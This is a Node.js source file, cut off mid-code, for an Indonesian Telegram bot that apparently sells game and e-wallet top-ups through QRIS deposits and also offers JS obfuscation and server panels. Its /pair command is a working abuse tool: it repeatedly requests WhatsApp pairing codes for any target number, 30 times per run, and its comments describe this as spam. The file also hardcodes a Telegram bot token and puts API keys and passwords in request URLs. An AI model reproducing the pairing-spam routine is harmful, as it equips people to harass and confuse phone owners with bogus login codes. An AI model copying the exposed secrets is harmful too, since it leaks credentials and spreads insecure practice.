require("./database/settings")
const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const axios = require('axios');
const chalk = require('chalk');
const CFonts = require('cfonts');
const fetch = require('node-fetch')
const JsConfuser = require('js-confuser');
const crypto = require("crypto")
const { Client } = require('ssh2');
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');
const { setTimeout: sleep } = require('timers/promises');
const path = require('path');

async function CarbonifyV1(input) {
  let Blobs = await fetch("https://carbonara.solopov.dev/api/cook", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        "code": input
      })
    })
    .then(response => response.blob())
  let arrayBuffer = await Blobs.arrayBuffer();
  let buffer = Buffer.from(arrayBuffer);
  return buffer
}
const prefix = "/"



async function CarbonifyV2(input) {
  let Blobs = await fetch("https://carbon-api.vercel.app/api", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        "code": input
      })
    })
    .then(response => response.blob())
  let arrayBuffer = await Blobs.arrayBuffer();
  let buffer = Buffer.from(arrayBuffer);
  return buffer
}
function runtime (seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}


// Token bot
const token = '7961120034:AAEgdDhRYml5cv6kUn8Gzom5XTOZoC88oKk';
const bot = new Telegraf(token);

// Fungsi membaca database
const readDatabase = () => {
    if (!fs.existsSync('database/users.json')) {
        fs.writeFileSync('database/users.json', JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync('database/users.json'));
};


;
let toRupiahh = number => parseInt(number).toLocaleString('id-ID')
function countProfit(jumlahAwal) {
    jumlahAwal = parseInt(jumlahAwal)
    let keuntungan = jumlahAwal * 1
    if (keuntungan > 1000) {
        keuntungan = 1000
    }
    return (jumlahAwal + keuntungan).toFixed(0)
}



// Fungsi menyimpan database
const saveDatabase = (data) => {
    fs.writeFileSync('database/users.json', JSON.stringify(data, null, 2));
};

// Fungsi memperbarui saldo pengguna
const updateUserBalance = (chatId, amount) => {
    const users = readDatabase();
    const userIndex = users.findIndex(user => user.chatId === chatId);

    if (userIndex !== -1) {
        // Jika pengguna sudah ada, perbarui saldo
        users[userIndex].balance = (users[userIndex].balance || 0) + amount;
    } else {
        // Jika pengguna belum ada, tambahkan pengguna baru
        users.push({ chatId, balance: amount });
    }

    saveDatabase(users); // Simpan perubahan ke database
    return { success: true, balance: users.find(user => user.chatId === chatId).balance };
};
// Fungsi untuk mengecek saldo pengguna dan mengurangi saldo jika cukup
const useUserBalance = (chatId, amount) => {
    const users = readDatabase();
    const userIndex = users.findIndex(user => user.chatId === chatId);

    if (userIndex === -1) {
        return { success: false, message: "Pengguna tidak ditemukan. Silakan mendaftar atau melakukan deposit terlebih dahulu." };
    }

    const user = users[userIndex];
    if ((user.balance || 0) < amount) {
        return { success: false, message: "❌ OPS, SALDO KAMU KURANG SILAHKAN MELAKUKAN DEPOSIT." };
    }

    user.balance -= amount; // Kurangi saldo
    saveDatabase(users); // Simpan perubahan ke database
    return { success: true, balance: user.balance };
};



// Fungsi memeriksa apakah pengguna terdaftar
const isUserRegistered = (chatId) => {
    const users = readDatabase();
    return users.find(user => user.chatId === chatId);
};

// Perintah /start
bot.start((Rafael) => {
    const chatId = Rafael.chat.id;
    const imageUrl = `${global.thumb}`;
    Rafael.replyWithPhoto(imageUrl, {
        caption: `Hallo! Selamat datang di ${global.namastore}. Bot ini disistem agar dapat melakukan pembelian otomatis, jika ada error silahkan report pada /owner`,
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Menu', callback_data: 'menu' }
                ],
                [
                    { text: 'Hubungi Owner', url: `https://t.me/RafaMods` }
                ]
            ]
        }
    });
});


bot.on('callback_query', async (Rafael) => {
    try {
        const data = Rafael.callbackQuery.data;
        const chatId = Rafael.chat.id;
        const users = readDatabase();
        const user = users.find(user => user.chatId === chatId);

        if (data === 'menu') {
            if (!user) {
                await Rafael.reply('🛑ᴀᴄᴄᴇs ᴅᴇɴɪᴇᴅ🛑, ᴍᴏʜᴏɴ ᴍᴀᴀғ, ᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ ᴅɪ ᴅᴀᴛᴀʙᴀsᴇ, sɪʟᴀʜᴋᴀɴ ᴍᴇɴᴅᴀғᴛᴀʀ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ');
                return;
            }

            let status;
            if (user.balance > 50000) {
                status = 'ʙᴀɴɢsᴀᴡᴀɴ';
            } else if (user.balance > 20000) {
                status = 'ʀᴀᴋʏᴀᴛ ʙɪᴀsᴀ';
            } else {
                status = 'ʀᴀᴋʏᴀᴛ ᴊᴇʟᴀᴛᴀ';
            }

            // Mengambil saldo bot dari API
            let saldoBot = 'Tidak tersedia'; // Default jika gagal
            try {
                const response = await axios.get(`https://h2h.okeconnect.com/trx/balance?memberID=${MERCHANT}&pin=${PIN}&password=${PASSWORD}`);
                const responseText = response.data; // Asumsikan respons berupa string
                const saldoMatch = responseText.match(/\d+/); // Cari angka dalam respons
                if (saldoMatch) {
                    saldoBot = parseInt(saldoMatch[0], 10).toLocaleString('id-ID'); // Konversi ke format lokal
                }
            } catch (err) {
                console.error("Gagal mengambil saldo bot: ", err);
            }

            const imageUrl = `${global.thumb}`;
            const totalUsers = users.length;

            await Rafael.replyWithPhoto(imageUrl, {
                caption: `ʜᴀʟʟᴏ! ᴘᴇɴɢɢᴜɴᴀ, sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ʙᴏᴛ ᴏᴛᴏᴍᴀᴛɪs ʀᴀғᴀᴇʟsᴛᴏʀᴇ
┏━━━━━━『 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 』
┊➺ ɪᴅ : ${user.chatId}
┊➺ sᴀʟᴅᴏ : Rp${user.balance.toLocaleString('id-ID')}
┊➺ sᴛᴀᴛᴜs : ${status}
┕━━━━━━━═┅═━––––––๑
┏━━━━━━『 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧 』
┊➺ ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}
┊➺ sᴀʟᴅᴏʙᴏᴛ : Rp. ${saldoBot}
┊➺ ᴛᴏᴛᴀʟᴜsᴇʀ : ${totalUsers}
┕━━━━━━━═┅═━––––––๑
┏━━━━━━『 𝗠𝗲𝗻𝘂 𝗥𝗲𝗴𝗶𝘀𝘁𝗲𝗿 』
┊➺ /register
┕━━━━━━━═┅═━––––––๑
┏━━━━━━『 𝗠𝗲𝗻𝘂 𝗗𝗲𝗽𝗼𝘀𝗶𝘁 』
┊➺ /deposit
┊➺ /batal
┊➺ /info
┕━━━━━━━═┅═━––––––๑
┏━━━━━━『 𝗠𝗲𝗻𝘂 𝗧𝗼𝗽𝗨𝗽 』
┊➺ /listmlbb
┊➺ /listfreefire
┊➺ /listdana
┊➺ /listgopay
┊➺ /listpubg
┊➺ /beli
┕━━━━━━━═┅═━––––––๑
┏━━━━━━『 𝗠𝗲𝗻𝘂 𝗧𝗼𝗼𝗹𝘀 』
┊➺ /pair
┊➺ /enc
┕━━━━━━━═┅═━––––––๑
┏━━━━━━『 𝗠𝗲𝗻𝘂 𝗢𝘁𝗼𝗺𝗮𝘁𝗶𝘀 』
┊➺ /buypanel
┊➺ /installpanel
┊➺ /startwings
┕━━━━━━━═┅═━––––––๑`
            });
        }
    } catch (error) {
        console.error("Error in callback_query: ", error);
        Rafael.reply("Terjadi kesalahan. Silakan coba lagi nanti.");
    }
});

bot.command('deposit', async (Rafael) => {
    const chatId = Rafael.chat.id;
    const user = isUserRegistered(chatId);

    if (!user) {
        await Rafael.reply(`❌ ᴏᴘsss, ᴍᴏʜᴏɴ ᴍᴀᴀғ, ᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ ᴘᴀᴅᴀ ᴅᴀᴛᴀʙᴀsᴇ ᴋᴀᴍɪ, sɪʟᴀʜᴋᴀɴ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʀᴇɢɪsᴛᴇʀ`);
        return;
    }

    const transactionStatus = getUserTransactionStatus(chatId);

    if (transactionStatus === 'pending') {
        await Rafael.reply(`❌ ᴏᴘsss, ᴋᴀᴍᴜ ᴍᴀsɪʜ ᴍᴇᴍɪʟɪᴋɪ ᴅᴇᴘᴏsɪᴛ ʏᴀɴɢ ʙᴇʟᴜᴍ ᴛᴇʀsᴇʟᴇsᴀɪᴋᴀɴ ɴɪʜ, sɪʟᴀʜᴋᴀɴ sᴇʟᴇsᴀɪᴋᴀɴ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ᴀɴᴅᴀ ᴀᴛᴀᴜ ᴍᴇɴᴇᴋᴀɴ ʙᴜᴛᴛᴏɴ ᴄᴀɴᴄᴇʟ ᴘᴀᴅᴀ ǫʀɪs`);
        return;
    }

    await Rafael.reply('🛑 ᴍᴀsᴜᴋᴀɴ ɴᴏᴍɪɴᴀʟ ᴅᴇᴘᴏsɪᴛ ᴀɴᴅᴀ');
    updateUserTransactionStatus(chatId, 'pending');

    const listener = bot.on('text', async (msgRafael) => {
        if (msgRafael.chat.id === chatId) {
            const amount = parseInt(msgRafael.text);

            if (isNaN(amount) || amount <= 0) {
                await msgRafael.reply('❌ ɪɴᴠᴀʟɪᴅ, ᴘᴀsᴛɪᴋᴀɴ ʜᴀɴʏᴀ ᴀɴɢᴋᴀ');
                updateUserTransactionStatus(chatId, 'cancelled');
                bot.off('text', listener);
                return;
            }

            const apiUrl = `https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${codeqr}`;

            try {
                const createPaymentResponse = await axios.get(apiUrl);
                const qrImageUrl = createPaymentResponse.data?.result?.qrImageUrl;

                if (!qrImageUrl) {
                    await msgRafael.reply('🛑 sɪsᴛᴇᴍ ᴇʀʀᴏʀ, sɪʟᴀʜᴋᴀɴ ᴄᴏʙᴀ ʟᴀɢɪ ᴋᴇᴍʙᴀʟɪ');
                    updateUserTransactionStatus(chatId, 'cancelled');
                    bot.off('text', listener);
                    return;
                }

                const currentDate = getCurrentDate();

                const sentMessage = await msgRafael.replyWithPhoto({ url: qrImageUrl }, {
                    caption: `▧ 𝙄𝙣𝙫𝙤𝙞𝙘𝙚 𝙋𝙚𝙢𝙗𝙖𝙮𝙖𝙧𝙖𝙣 - ${global.namastore} ▧
ɪᴅ ᴛʀᴀɴsᴀᴋsɪ : ${createPaymentResponse.data?.result?.transactionId}
ᴛᴏᴛᴀʟ ᴘᴇᴍʙᴀʏᴀʀᴀɴ : Rp${amount.toLocaleString('id-ID')}
ᴛᴀɴɢɢᴀʟ ᴘᴇᴍʙᴇʟɪᴀɴ : ${currentDate}
ᴘʀᴏᴅᴜᴋ : ᴅᴇᴘᴏsɪᴛ
ǫʀ ᴇxᴘɪʀᴇᴅ : 5 ᴍᴇɴɪᴛ

ᴄᴀɴᴄᴇʟ ᴅᴇᴘᴏsɪᴛ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ ᴋᴇᴛɪᴋ /batal

📌 𝗡𝗢𝗧𝗘 :
1. ǫʀɪs ʜᴀɴʏᴀ ʙᴇʀʟᴀᴋᴜ sᴇʟᴀᴍᴀ 5 ᴍᴇɴɪᴛ
2. ǫʀɪs ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ 1 ᴋᴀʟɪ ᴛʀᴀɴsғᴇʀ
3. sᴇᴛᴇʟᴀʜ sᴇʟᴇsᴀɪ ᴍᴇᴍʙᴀʏᴀʀ ᴛᴜɴɢɢᴜ ɴᴏᴛɪғɪᴋᴀsɪ ᴅᴀʀɪ ʙᴏᴛ
4. ʟᴀᴘᴏʀᴋᴀɴ ᴘᴀᴅᴀ ᴏᴡɴᴇʀ ᴊɪᴋᴀ sᴀʟᴅᴏ ᴛɪᴅᴀᴋ ᴍᴀsᴜᴋ / ᴛᴇʀᴊᴀᴅɪ ᴇʀʀᴏʀ /owner`,

                });


                // Cek status pembayaran
                const checkPaymentUrl = `https://api.rafaelxputra.my.id/api/orkut/cekstatus?merchant=${merchant}&keyorkut=${keyorkut}`;
                let isTransactionComplete = false;

                while (!isTransactionComplete) {
                    try {
                        const checkPaymentResponse = await axios.get(checkPaymentUrl);
                        const paymentData = checkPaymentResponse.data;

                        if (paymentData && paymentData.amount && parseInt(paymentData.amount) === amount) {
                            isTransactionComplete = true;
                            updateUserBalance(chatId, amount);
                            updateUserTransactionStatus(chatId, 'completed');
                            await msgRafael.reply(`📌 ɪɴғᴏᴍᴀsɪ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ᴀɴᴅᴀ
sᴛᴀᴛᴜs : sᴜᴋsᴇs 
ᴛᴏᴛᴀʟ ᴅᴇᴘᴏsɪᴛ : Rp${amount.toLocaleString('id-ID')}
ᴛᴀɴɢɢᴀʟ  : ${currentDate}`);
                        }
                    } catch (error) {
                        console.error('Error memeriksa status transaksi:', error);
                    }

                    if (!isTransactionComplete) {
                        await new Promise(resolve => setTimeout(resolve, 10000));
                    }
                }
            } catch (error) {
                console.error('Error membuat QRIS atau memeriksa status:', error);
                await msgRafael.reply('Terjadi kesalahan saat memproses deposit. Silakan coba lagi.');
                updateUserTransactionStatus(chatId, 'cancelled');
            } finally {
                bot.off('text', listener);
            }
        }
    });
});

bot.on('callback_query', async (data) => {
    if (data.data === 'cancel_deposit') {
        const chatId = data.message.chat.id;
        const user = isUserRegistered(chatId);

        if (!user) {
            await bot.sendMessage(chatId, 'Anda belum terdaftar. Silakan daftar terlebih dahulu dengan menekan tombol Daftar.');
            return;
        }

        const transactionStatus = getUserTransactionStatus(chatId);

        if (transactionStatus !== 'pending') {
            await bot.sendMessage(chatId, 'Tidak ada transaksi deposit yang perlu dibatalkan.');
            return;
        }

        updateUserTransactionStatus(chatId, 'cancelled');
        await bot.sendMessage(chatId, 'Transaksi deposit telah dibatalkan. Anda dapat memulai proses deposit baru.');
    }
});


bot.command('register', async (Rafael) => {
    const users = readDatabase();
    const chatId = Rafael.chat.id;
    const args = Rafael.message.text.split(' ').slice(1).join(' '); // Mengambil argumen setelah /register
    const isRegistered = users.find(user => user.chatId === chatId);

    if (isRegistered) {
        await Rafael.reply('Anda sudah terdaftar!');
    } else if (!args) {
        await Rafael.reply('Format pendaftaran salah. Gunakan format: /register <nama>');
    } else {
        const name = args; // Nama pengguna dari argumen
        users.push({ chatId, name, balance: 0 });
        saveDatabase(users);

        await Rafael.replyWithMarkdown(`
───「 *𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜* 」───

○ *Nomor*: ${chatId}
○ *Nama*: ${name}
○ *Status*: Sukses ✅ 

Terimakasih *${name}* sudah mendaftar di *${global.namastore || 'RafaelStore'}*!
        `);
    }
});






bot.command('listdana', async (Rafael) => {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");

        // Filter dan urutkan opsi Top Up DANA berdasarkan harga
        const dana = data
            .filter(item => /Top Up Saldo DANA/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);

        // Format daftar produk
        const list = dana.map((item) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|${item.keterangan} \nHarga: ${toRupiahh(harga)} \nStatus: ${status}`;
        });

        const message = `[ *LIST HARGA PRODUK DANA* ]\n\n${list.join('\n\n')}`;

        // Kirim pesan ke pengguna
        await Rafael.reply(message);
    } catch (error) {
        console.error("Error fetching DANA data:", error);
        await Rafael.reply("Terjadi kesalahan saat mengambil data DANA.");
    }
});


bot.command('listfreefire', async (Rafael) => {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");

        // Filter dan urutkan data Free Fire
        let ff = data.filter(v => /TPG Diamond Free Fire/i.test(v.produk) && v.harga > 0);
        ff.sort((a, b) => a.harga - b.harga);

        // Membuat daftar produk
        const list = ff.map((item) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|IDGame
Nama Produk: ${item.keterangan} 
Harga: ${toRupiahh(harga)} 
Status: ${status}`;
        });

        // Gabungkan header dengan daftar produk
        const message = `[ *LIST HARGA PRODUK FREEFIRE* ]\n\n${list.join('\n\n')}`;
        await Rafael.reply(message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error("Error fetching Free Fire data:", error);
        await Rafael.reply("Terjadi kesalahan saat mengambil data Free Fire.");
    }
});
bot.command('listmlbb', async (Rafael) => {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");

        let mlbb = data.filter(v => /TPG Diamond Mobile Legends/i.test(v.produk) && v.harga > 0);
        mlbb.sort((a, b) => a.harga - b.harga);

        const list = mlbb.map((item, index) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|IDGame
Nama Produk: ${item.keterangan} 
Harga: ${toRupiahh(harga)} 
Status: ${status}`;
        });

        const header = `[ *LIST HARGA PRODUK MLBB* ]
Pastikan ID Game Anda Benar
Contoh : 123456(1234)
Cara Penggunaan: 1234561234\n\n`;
        let message = header + list.join('\n\n');

        // Batas karakter Telegram
        const maxLength = 4096;

        // Kirim pesan yang sesuai dengan batas
        if (message.length > maxLength) {
            message = message.slice(0, maxLength - 50) + `\n\n[Pesan dipotong. Tampilkan sebagian daftar saja.]`;
        }

        await Rafael.reply(message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error("Error fetching MLBB data:", error);
        await Rafael.reply("Terjadi kesalahan saat mengambil data MLBB.");
    }
});

bot.command('listpubg', async (Rafael) => {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");

        let pubg = data.filter(v => /TPG Game Mobile PUBG/i.test(v.produk) && v.harga > 0);
        pubg.sort((a, b) => a.harga - b.harga);

        const list = pubg.map((item) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|IDGame
Nama Produk: ${item.keterangan} 
Harga: ${toRupiahh(harga)} 
Status: ${status}`;
        });

        const header = `[ *LIST HARGA PRODUK PUBG* ]\n\n`;
        let message = header + list.join('\n\n');

        // Batas karakter Telegram
        const maxLength = 4096;

        // Kirim pesan yang sesuai dengan batas
        if (message.length > maxLength) {
            message = message.slice(0, maxLength - 50) + `\n\n[Pesan dipotong. Tampilkan sebagian daftar saja.]`;
        }

        await Rafael.reply(message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error("Error fetching PUBG data:", error);
        await Rafael.reply("Terjadi kesalahan saat mengambil data PUBG.");
    }
});

bot.command('listgopay', async (Rafael) => {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");

        // Filter dan urutkan data GoPay
        let gopay = data.filter(v => /Top Up Saldo GO-JEK Customer/i.test(v.produk) && v.harga > 0);
        gopay.sort((a, b) => a.harga - b.harga);

        // Membuat daftar produk
        const list = gopay.map((item) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|Nomor Pelanggan
Nama Produk: ${item.keterangan} 
Harga: ${toRupiahh(harga)} 
Status: ${status}`;
        });

        // Gabungkan header dengan daftar produk
        const message = `[ *LIST HARGA PRODUK GOPAY* ]\n\n${list.join('\n\n')}`;
        await Rafael.reply(message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error("Error fetching GoPay data:", error);
        await Rafael.reply("Terjadi kesalahan saat mengambil data GoPay.");
    }
});

// Fungsi memperbarui status transaksi pengguna
const updateUserTransactionStatus = (chatId, status) => {
    const users = readDatabase();
    const userIndex = users.findIndex(user => user.chatId === chatId);

    if (userIndex !== -1) {
        users[userIndex].transactionStatus = status; // "pending", "completed", "cancelled"
        saveDatabase(users);
    }
};

// Fungsi memeriksa status transaksi pengguna
const getUserTransactionStatus = (chatId) => {
    const users = readDatabase();
    const user = users.find(user => user.chatId === chatId);
    return user ? user.transactionStatus : null;
};

// Perintah /deposit
const getCurrentDate = () => {
    const now = new Date();
    const options = {
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        timeZone: 'Asia/Jakarta',
        timeZoneName: 'short'
    };
    return new Intl.DateTimeFormat('id-ID', options).format(now);
};




// Perintah /batal untuk membatalkan transaksi


bot.command('batal', async (Rafael) => {
    const chatId = Rafael.chat.id;
    const user = isUserRegistered(chatId);

    if (!user) {
        Rafael.reply('Anda belum terdaftar. Silakan daftar terlebih dahulu dengan menekan tombol Daftar.');
        return;
    }

    const transactionStatus = getUserTransactionStatus(chatId);

    if (transactionStatus !== 'pending') {
        Rafael.reply('Tidak ada transaksi deposit yang perlu dibatalkan.');
        return;
    }

    // Reset status transaksi
    updateUserTransactionStatus(chatId, 'cancelled');
    Rafael.reply('Transaksi deposit telah dibatalkan. Anda dapat memulai proses deposit baru.');
});

// Perintah /info untuk menampilkan informasi pengguna
bot.command('info', async (Rafael) => {
    const chatId = Rafael.chat.id;
    const users = readDatabase();
    const user = users.find(user => user.chatId === chatId);

    if (!user) {
        await Rafael.reply('Anda belum terdaftar. Silakan daftar terlebih dahulu dengan menekan tombol Daftar.');
        return;
    }

    // Tentukan status berdasarkan saldo
    let status;
    if (user.balance > 50000) {
        status = 'Bangsawan';
    } else if (user.balance > 20000) {
        status = 'Rakyat Biasa';
    } else {
        status = 'Rakyat Jelata';
    }

    // Kirim informasi pengguna
    await Rafael.reply(`Informasi Pengguna:
ID: ${user.chatId}
Nama: ${user.name}
Saldo: Rp${user.balance.toLocaleString('id-ID')}
Status: ${status}`);
});

bot.command('saldo', async (Rafael) => {
  try {
    // Memanggil API untuk mendapatkan saldo
    const response = await axios.get(`https://h2h.okeconnect.com/trx/balance?memberID=${MERCHANT}&pin=${PIN}&password=${PASSWORD}`);

    // Memastikan data berhasil diterima dan ditampilkan
    if (response && response.data) {
      Rafael.reply(`Saldo Anda: ${response.data}`);
    } else {
      Rafael.reply('Tidak dapat mengambil saldo. Silakan coba lagi nanti.');
    }
  } catch (error) {
    console.error('Error:', error.message);
    Rafael.reply('Terjadi kesalahan saat mengambil data saldo. Pastikan kredensial Anda benar.');
  }
});

const cooldowns = new Map();
bot.command('pair', async (Rafael) => {
  const chatId = Rafael.chat.id;
  const lastUsed = cooldowns.get(chatId);
  const now = Date.now();
  const cooldownTime = 10 * 60 * 1000;
  if (lastUsed && now - lastUsed < cooldownTime) {
    const remainingTime = Math.ceil((cooldownTime - (now - lastUsed)) / 1000);
    const minutes = Math.floor(remainingTime / 60);
    const seconds = remainingTime % 60;
    return Rafael.reply(
      `Anda baru saja menggunakan fitur ini. Harap tunggu ${minutes} menit ${seconds} detik sebelum mencoba lagi.`
    );
  }
  if (!isUserRegistered(chatId)) {
    return Rafael.reply(
      "Anda belum terdaftar. Silakan daftar terlebih dahulu dengan mengetik /start."
    );
  }
  const input = Rafael.message.text.split(' ')[1]; // Format: pair 628
  if (!input) {
    return Rafael.reply('Format salah! Gunakan: pair <target>');
  }
  const target = input;
  const count = 30; // Jumlah spam otomatis diatur menjadi 30

  const sessionPath = path.resolve('pair');
  const deleteSessionFiles = (sessionDir) => {
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
      console.log('Session files deleted.');
    }
  };
  deleteSessionFiles(sessionPath);
  (async () => {
    try {
      const { state, saveCreds } = await useMultiFileAuthState('pair');
      const { version } = await fetchLatestBaileysVersion();

      const sucked = makeWaSocket({
        auth: state,
        version,
        logger: pino({ level: 'fatal' }),
      });
      sucked.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
          const shouldReconnect = lastDisconnect.error?.output?.statusCode !== 401;
          console.log('Koneksi terputus, mencoba reconnect:', shouldReconnect);
          if (shouldReconnect) {
            makeWaSocket({
              auth: state,
              version,
              logger: pino({ level: 'fatal' }),
            });
          } else {
            console.log('Autentikasi kadaluarsa, harap login ulang.');
          }
        }
      });
      Rafael.reply(`Memulai spam pairing ke ${target} sebanyak ${count} kali...`);
      for (let i = 0; i < count; i++) {
        await sleep(2000);
        try {
          const prc = await sucked.requestPairingCode(target);
        } catch (err) {
          console.error(`# Failed to send pairing code - Number: ${target} - Error: ${err.message}`);
        }
      }
      await sleep(15000);
      console.log('Spam selesai.');
      await saveCreds();
      deleteSessionFiles(sessionPath);
      cooldowns.set(chatId, now);
      Rafael.reply(`Sukses spam pairing ke ${target}, total: ${count}`);
    } catch (err) {
      console.error(`Error: ${err.message}`);
      Rafael.reply(`Gagal melakukan spam pairing: ${err.message}`);
    }
  })();
  return Rafael.reply('Permintaan Anda sedang diproses. Anda dapat menjalankan command lain sementara menunggu.');
});



const waitingForFile = new Map();

bot.command('enc', async (Rafael) => {
    const userId = Rafael.from.id;
amount = 100
   // Gunakan saldo
    const result = useUserBalance(userId, amount);
    if (!result.success) {
        return Rafael.reply(result.message); // Jika saldo tidak mencukupi atau pengguna tidak ditemukan
    }
    waitingForFile.set(userId, true);
    Rafael.reply('Silakan kirim file .js yang ingin dienkripsi.');
});

bot.on('document', async (Rafael) => {

    const userId = Rafael.from.id;

    if (!waitingForFile.has(userId)) {
        return Rafael.reply('Gunakan perintah /enc terlebih dahulu untuk memulai proses enkripsi.');
    }

    const file = Rafael.message.document;
    if (file.mime_type !== 'application/javascript') {
        return Rafael.reply('File yang dikirim bukan file JavaScript (.js). Silakan kirim file dengan ekstensi .js.');
    }

    try {
        waitingForFile.delete(userId);
        const fileLink = await Rafael.telegram.getFileLink(file.file_id);
        
        // Perbaikan response.buffer error
        const response = await fetch(fileLink.href);
        const media = Buffer.from(await response.arrayBuffer());

        const fileName = file.file_name;
        const tempFileName = `./@hardenc${fileName}.js`;

        fs.writeFileSync(tempFileName, media);

        await Rafael.reply('Memproses enkripsi hard code . . .');

        // Konfigurasi JsConfuser
        const obfuscated = await JsConfuser.obfuscate(media.toString(), {
            target: "node",
            preset: "high",
            compact: true,
            minify: true,
            flatten: true,
            identifierGenerator: function () {
                const originalString = "KKKKKKKKKKKK";
                function unidentifiedReplacer(input) {
                    return input.replace(/[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, '');
                }
                function randomString(panjang) {
                    let hasil = '';
                    const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                    const panjangKarakter = karakter.length;
                    for (let i = 0; i < panjang; i++) {
                        hasil += karakter.charAt(
                            Math.floor(Math.random() * panjangKarakter)
                        );
                    }
                    return hasil;
                }
                return unidentifiedReplacer(originalString) + randomString(2);
            },
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: 0.01,
            stringSplitting: 0.1,
            stringConcealing: true,
            stringCompression: true,
            duplicateLiteralsRemoval: true,
            movedDeclarations: true,
            objectExtraction: true,
            globalConcealing: true,
        });

        // Simpan file hasil enkripsi
        fs.writeFileSync(tempFileName, obfuscated);

        // Kirim file yang sudah terenkripsi
        await Rafael.replyWithDocument({ source: tempFileName, filename: fileName, caption: 'Encrypt File JS Sukses! Type:\nHard Encryption' });

        // Hapus file sementara
        fs.unlinkSync(tempFileName);
    } catch (error) {
        console.error(error);
        return Rafael.reply('Terjadi kesalahan saat mengenkripsi file: ' + error.message);
    }
});





// Command handler for "/buypanel" or "/belipanel"
bot.command(['buypanel', 'belipanel'], async (Rafael) => {
    const text = Rafael.message.text.split(' ').slice(1).join(' ');
    if (!text) return Rafael.reply('Format: nama,1gb');

    const [username, packageName] = text.split(',');
    if (!username || !packageName) return Rafael.reply('Format: nama,1gb');

    // Define packages
    const packages = {
        "1gb": { ram: "1024", disk: "1024", cpu: "40", harga: 1000 },
        "2gb": { ram: "2048", disk: "2048", cpu: "60", harga: 2000 },
        "3gb": { ram: "3072", disk: "3072", cpu: "80", harga: 3000 },
        "4gb": { ram: "4096", disk: "4096", cpu: "100", harga: 4000 },
        "5gb": { ram: "5120", disk: "5120", cpu: "120", harga: 5000 },
        "6gb": { ram: "6144", disk: "6144", cpu: "140", harga: 6000 },
        "7gb": { ram: "7168", disk: "7168", cpu: "160", harga: 7000 },
        "8gb": { ram: "8192", disk: "8192", cpu: "180", harga: 8000 },
        "9gb": { ram: "9216", disk: "9216", cpu: "200", harga: 9000 },
        "10gb": { ram: "10240", disk: "10240", cpu: "220", harga: 10000 },
        "unli": { ram: "0", disk: "0", cpu: "0", harga: 15000 }
    };

    const selectedPackage = packages[packageName.toLowerCase()];
    if (!selectedPackage) return Rafael.reply('Paket tidak valid. Contoh: nama,1gb');

    const { ram, disk, cpu, harga } = selectedPackage;
    const ppn = Math.floor(Math.random() * 100) + 1;
    const totalAmount = harga + ppn;
    const email = `${username.toLowerCase()}@rafaellzy.xyz`;
    const name = username.charAt(0).toUpperCase() + username.slice(1);
    const password = `${username}${crypto.randomBytes(2).toString('hex')}`;

    try {
        // Create payment
        const paymentResponse = await fetch(
